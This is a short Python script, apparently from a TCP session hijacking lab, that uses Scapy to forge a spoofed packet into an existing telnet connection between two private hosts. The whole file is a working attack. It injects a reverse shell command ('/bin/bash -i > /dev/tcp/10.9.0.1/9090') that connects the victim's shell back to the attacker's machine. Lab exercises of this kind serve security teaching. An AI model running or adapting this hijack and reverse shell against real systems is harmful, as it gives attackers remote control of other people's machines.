#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=47078, dport=23, flags="A", seq=1786695429, ack=468366257)
data = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \r"
pkt = ip/tcp/data

ls(pkt)
send(pkt, iface="br-3e5f42528ad9", verbose=0)
